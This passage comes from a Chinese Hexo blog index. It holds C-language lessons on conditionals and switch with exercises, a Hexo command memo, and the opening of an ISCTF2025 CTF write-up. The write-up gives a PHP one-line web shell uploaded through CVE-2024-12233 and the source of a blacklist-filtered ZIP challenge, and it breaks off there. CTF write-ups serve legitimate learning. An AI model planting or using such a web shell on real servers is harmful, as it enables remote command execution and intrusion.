&#x27;\0&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符变量 c 的大小: %lu\n&quot;</span>, <span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符串 \&quot;A\&quot; 的大小: %lu\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;A&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>混淆概念，以为 <code>&quot;A&quot;</code> 也只占 1 个字节。</p>
</li>
<li><p>试图写 <code>char c = &quot;A&quot;;</code> 导致编译报错（类型不匹配）。</p>
</li>
<li><p>在 <code>printf</code> 里打印双引号需要转义：<code>\&quot;</code>。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>2. 流程控制(选择结构)</title>
    <url>/2025/12/11/2.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6(%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84)/</url>
    <content><![CDATA[<h1 id="第二章：流程控制-选择结构"><a href="#第二章：流程控制-选择结构" class="headerlink" title="第二章：流程控制 (选择结构) "></a>第二章：流程控制 (选择结构) </h1><p><strong>本章核心：</strong> 让程序学会“思考”和“做决定”（如果…就…，否则…）。</p>
<hr>
<h2 id="1-关系运算符与逻辑运算符"><a href="#1-关系运算符与逻辑运算符" class="headerlink" title="1. 关系运算符与逻辑运算符"></a>1. 关系运算符与逻辑运算符</h2><p>判断语句基于关系运算符（例如 <code>&gt;</code>、<code>==</code>）的结果（真或假）。</p>
<h3 id="1-1-关系运算符"><a href="#1-1-关系运算符" class="headerlink" title="1.1 关系运算符"></a>1.1 关系运算符</h3><p><code>==</code> (等于), <code>!=</code> (不等于), <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>。</p>
<h3 id="1-2-逻辑运算符"><a href="#1-2-逻辑运算符" class="headerlink" title="1.2 逻辑运算符"></a>1.2 逻辑运算符</h3><p><code>&amp;&amp;</code> (与), <code>||</code> (或), <code>!</code> (非)。</p>
<p><strong>补充考点：</strong></p>
<ul>
<li><p><strong>数学写法 vs C 语言写法</strong>：</p>
<ul>
<li><p>数学里写：$0 &lt; x &lt; 10$</p>
</li>
<li><p>C 语言<strong>必须</strong>写成：<code>(x &gt; 0) &amp;&amp; (x &lt; 10)</code></p>
</li>
</ul>
</li>
<li><p><strong>优先级</strong>：</p>
<ul>
<li><code>!</code> (最高) &gt; 算术运算符 &gt; 关系运算符 &gt; <code>&amp;&amp;</code> &gt; <code>||</code> (最低)。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="习题-1-对应：关系与逻辑运算"><a href="#习题-1-对应：关系与逻辑运算" class="headerlink" title="习题 1 (对应：关系与逻辑运算)"></a>习题 1 (对应：关系与逻辑运算)</h3><p><strong>题目：</strong> 编写代码判断输入的三个整数 a, b, c 能否构成三角形。</p>
<p><strong>构成三角形的条件：</strong> 任意两边之和大于第三边。</p>
<p><strong>要求：</strong> 使用逻辑与运算符 <code>&amp;&amp;</code> 连接三个条件。</p>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入三边: 3 4 5</span><br><span class="line">可以构成三角形</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入三边: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须三个条件同时满足，所以用 &amp;&amp;</span></span><br><span class="line">    <span class="keyword">if</span> ((a + b &gt; c) &amp;&amp; (a + c &gt; b) &amp;&amp; (b + c &gt; a)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;可以构成三角形\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法构成三角形\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>将 <code>a+b&gt;c</code> 等条件用 <code>||</code> 连接（变成了“只要有一组边满足就行”，逻辑错误）。</p>
</li>
<li><p>试图写成数学连写形式 <code>a+b&gt;c&gt;...</code> (C 语言不支持)。</p>
</li>
</ol>
<hr>
<h2 id="2-if-else-结构"><a href="#2-if-else-结构" class="headerlink" title="2. if-else 结构"></a>2. <code>if-else</code> 结构</h2><p>用于根据条件的真假执行不同的代码块。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件表达式) &#123;</span><br><span class="line">    <span class="comment">// 1. 如果条件为真 (非0)，执行这里的代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 2. 如果条件为假 (0)，执行这里的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong> 判断一个数是否为正数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">-5</span>;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;是正数\n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;不是正数\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: 不是正数</span></span><br></pre></td></tr></table></figure>

<p><strong>补充考点 (悬挂 else)：</strong></p>
<p>当有多个 if 和 else 嵌套时，C 语言规定：else 总是与它上面最近的、未配对的 if 配对。</p>
<ul>
<li><strong>建议</strong>：无论只有一行代码还是多行，永远加上 <code>{ }</code>，防止逻辑混乱。</li>
</ul>
<hr>
<h2 id="3-多重条件-if-else-if-else"><a href="#3-多重条件-if-else-if-else" class="headerlink" title="3. 多重条件 (if-else if-else)"></a>3. 多重条件 (<code>if-else if-else</code>)</h2><p>用于处理多个互斥的条件判断。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件 <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 满足条件 1</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件 <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// 不满足条件 1，但满足条件 2</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 所有条件都不满足</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="习题-2"><a href="#习题-2" class="headerlink" title="习题 2"></a>习题 2</h3><p><strong>题目：</strong> 编写程序，接收用户输入的<strong>整数成绩 (<code>score</code>)</strong>，根据以下标准输出评定结果。</p>
<p><strong>要求：</strong></p>
<ol>
<li><p>使用 <code>if-else if-else</code> 结构。</p>
</li>
<li><p>成绩范围 0-100。</p>
<ul>
<li><p>$\ge 90$: A (优秀)</p>
</li>
<li><p>$\ge 70$ 且 $&lt; 90$: B (良好)</p>
</li>
<li><p>$&lt; 70$: C (及格线以下)</p>
</li>
</ul>
</li>
</ol>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入您的成绩 (0-100): </span><br><span class="line">85</span><br><span class="line">评定结果: B (良好)</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入您的成绩 (0-100): \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 标准逻辑流：从高到低判断，代码更易读</span></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: A (优秀)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        <span class="comment">// 能走到这里，说明分数肯定小于 90，所以只需判断是否 &gt;= 70</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: B (良好)\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 剩下的所有情况 (即小于 70)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;评定结果: C (及格线以下)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>逻辑顺序混乱：如果先判断 <code>score &gt;= 70</code>，那么 95 分也会被判定为 B（因为 95 也大于 70）。</p>
</li>
<li><p>在 <code>else</code> 后面画蛇添足加条件（<code>else (score &lt; 70)</code> 是语法错误，<code>else</code> 后不能跟括号）。</p>
</li>
</ol>
<hr>
<h2 id="4-switch-case-结构"><a href="#4-switch-case-结构" class="headerlink" title="4. switch-case 结构"></a>4. <code>switch-case</code> 结构</h2><p>适用于<strong>一个变量</strong>的取值，需要执行<strong>多分支选择</strong>的情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (变量/表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">1</span>:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 必须要有！</span></span><br><span class="line">    <span class="keyword">case</span> 常量值<span class="number">2</span>:</span><br><span class="line">        <span class="comment">// 执行代码</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 如果所有 case 都不匹配，则执行 default</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>重点提醒 ：</strong></p>
<p><strong>易错点：</strong> switch 语句中 break 的使用</p>
<ul>
<li><strong>陷阱：</strong> 如果一个 <code>case</code> 分支中<strong>没有 <code>break</code></strong>，程序会继续执行下一个 <code>case</code> 分支的代码，直到遇到 <code>break</code> 或 <code>switch</code> 结束。这通常被称为<strong>穿透 (fall-through)</strong>，是初学者最常犯的逻辑错误。</li>
</ul>
<p><strong>补充考点 (类型限制)：</strong> switch 括号里的变量，以及 case 后面的值，必须是整数 (int) 或字符 (char)。</p>
<ul>
<li><p><strong>错误</strong>：<code>case 3.14:</code> (不能用浮点数)</p>
</li>
<li><p><strong>错误</strong>：<code>case &quot;A&quot;:</code> (不能用字符串，字符用单引号 <code>&#39;A&#39;</code>)</p>
</li>
</ul>
<hr>
<h3 id="习题-3"><a href="#习题-3" class="headerlink" title="习题 3"></a>习题 3</h3><p><strong>题目：</strong> 编写程序，接收用户输入的<strong>星期数 (1-7 之间的整数 <code>day</code>)</strong>，输出对应的星期名称（Monday, Tuesday… Sunday）。如果输入其他数字，输出 “Error”。</p>
<p><strong>要求：</strong></p>
<ol>
<li><p>必须使用 <strong><code>switch-case</code></strong> 结构。</p>
</li>
<li><p><strong>易错点：</strong> 每一个 <code>case</code> 结束时必须有 <strong><code>break;</code></strong>。</p>
</li>
<li><p><strong>默认处理：</strong> 使用 <code>default:</code> 处理非 1-7 的输入。</p>
</li>
</ol>
<p><strong>预期输出结果：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入星期数 (1-7): </span><br><span class="line">3</span><br><span class="line">星期三</span><br></pre></td></tr></table></figure>

<p><strong>答案：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> day; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入星期数 (1-7):\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;day);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(day) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期一\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// ✅ 必须有 break，防止穿透</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期二\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期三\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期四\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期五\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期六\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;星期日\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 处理所有非 1-7 的情况</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误，请输入1到7之间的数字。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>易错：</strong></p>
<ol>
<li><p>漏写 <code>break;</code> 导致程序打印出多天的名字。</p>
</li>
<li><p><code>switch</code> 后面的括号里不需要分号 <code>;</code>。</p>
</li>
<li><p><code>default</code> 拼写错误。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo命令与配置备忘录</title>
    <url>/2025/12/09/Hexo%E5%8D%9A%E5%AE%A2%E7%BB%B4%E6%8A%A4%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<blockquote>
<p>这是一篇写给我自己的备忘录，记录了博客日常维护、写文章和修改配置的常用命令。</p>
</blockquote>
<h2 id="常用命令速查"><a href="#常用命令速查" class="headerlink" title="常用命令速查"></a>常用命令速查</h2><p>在终端进入博客目录 <code>~/Hello_CTF/my_ctf_blog</code> 后使用。</p>
<h3 id="1-发布博客"><a href="#1-发布博客" class="headerlink" title="1. 发布博客"></a>1. 发布博客</h3><ol>
<li><p>创建新的markdown文件：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;新的wp&quot;</span></span><br></pre></td></tr></table></figure>
<p> 然后目录出现<code>新的wp.md</code></p>
</li>
<li><p>根据自身要求修改文件属性：</p>
 <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 这里写文章标题            # 标题：随便写，支持中文</span><br><span class="line">date: 2025-12-09 18:00:00       # 发布时间：注意格式，冒号后有空格</span><br><span class="line">updated: 2025-12-10 12:00:00    # 更新时间：可选，不写默认等于发布时间</span><br><span class="line">tags:                           # 标签：扁平化，一篇可以有多个</span><br><span class="line"><span class="bullet">    -</span> CTF</span><br><span class="line"><span class="bullet">    -</span> Web</span><br><span class="line">categories:                     # 分类：层级化，支持父子关系</span><br><span class="line"><span class="bullet">    -</span> 学习笔记                   #父分类</span><br><span class="line"><span class="section">    - 渗透测试                   # 子分类</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure>
<p> 注意事项：</p>
<ul>
<li>冒号后面必须有一个空格（比如 title: 标题 是对的，title:标题 是错的）。</li>
<li>缩进：分类和标签的列表要对齐。</li>
</ul>
<p> 还有“特效”字段：<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">cover: /img/封面图.png           # 首页卡片显示的封面图</span><br><span class="line">top<span class="emphasis">_img: /img/顶部图.png         # 点进文章后，顶部那个长条背景图</span></span><br><span class="line"><span class="emphasis">                                # (如果不写，默认显示你在 _</span>config.butterfly.yml 设置的那张 default<span class="emphasis">_top_</span>img)</span><br><span class="line"></span><br><span class="line">comments: true                  # 是否开启评论 (默认为 true，填 false 可关闭这篇的评论)</span><br><span class="line">toc: true                       # 是否显示右侧目录 (默认为 true)</span><br><span class="line">toc<span class="emphasis">_number: true                # 目录是否显示序号 (1. 1.1 ...)</span></span><br><span class="line"><span class="emphasis">copyright: true                 # 是否显示文末版权信息</span></span><br><span class="line"><span class="emphasis">---    </span></span><br></pre></td></tr></table></figure><br> 例如我想写c语言学习笔记：<br> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: C语言学习笔记01</span><br><span class="line">date: 2025-12-09 20:00:00</span><br><span class="line">updated: 2025-12-09 20:00:00</span><br><span class="line">categories:</span><br><span class="line"><span class="bullet">-</span> 编程语言      </span><br><span class="line"><span class="bullet">-</span> C语言         </span><br><span class="line">tags: </span><br><span class="line"><span class="bullet">-</span> C语言</span><br><span class="line">cover: /img/sg<span class="emphasis">_meter.jpg   </span></span><br><span class="line"><span class="emphasis">top_</span>img: /img/sg<span class="emphasis">_lab.jpg   </span></span><br><span class="line"><span class="emphasis">toc: true</span></span><br><span class="line"><span class="emphasis">toc_</span>number: true</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正文...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
</li>
<li><p>清理、构建、部署：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3>]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTF2025 wp</title>
    <url>/2025/12/11/ISCTF2025%20wp/</url>
    <content><![CDATA[<h1 id="1-b-by-n0t1ce-b0ard"><a href="#1-b-by-n0t1ce-b0ard" class="headerlink" title="1. \b@by n0t1ce b0ard"></a>1. \b@by n0t1ce b0ard</h1><p>提示很明显了，是CVE-2024-12233，上网查找进行复现</p>
<p>例如Email: <code>111@test.com</code>，同时上传shell.php，内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后蚁剑连接http:&#x2F;&#x2F;[题目IP]&#x2F;images&#x2F;<a href="mailto:&#49;&#49;&#49;&#64;&#116;&#101;&#115;&#116;&#46;&#x63;&#x6f;&#x6d;">111@test.com</a>&#x2F;shell.php</p>
<hr>
<h1 id="2-难过的bottle"><a href="#2-难过的bottle" class="headerlink" title="2. 难过的bottle"></a>2. 难过的bottle</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查内容是否包含黑名单中的关键词（不区分大小写）&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;安全解压ZIP文件（防止路径遍历攻击）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法文件路径: 路径遍历攻击检测&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;首页&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ZIP文件查看器&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot; id=&quot;index-page&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8 text-center&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body p-5&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;📤&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2 class=&quot;card-title&quot;&gt;轻松查看ZIP文件内容&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;p class=&quot;card-text&quot;&gt;上传ZIP文件并安全地查看其中的内容，无需解压到本地设备&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/upload&quot; class=&quot;btn btn-primary btn-lg px-4 me-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                📁 上传ZIP文件</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;#features&quot; class=&quot;btn btn-outline-secondary btn-lg px-4&quot;&gt;</span></span><br><span class="line"><span class="string">                                ℹ️ 了解更多</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row mt-5&quot; id=&quot;features&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;🛡️&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;安全检测&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;系统会自动检测上传文件，防止路径遍历攻击和恶意内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;📄&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;内容预览&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;直接在线查看ZIP文件中的文本内容，无需下载&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            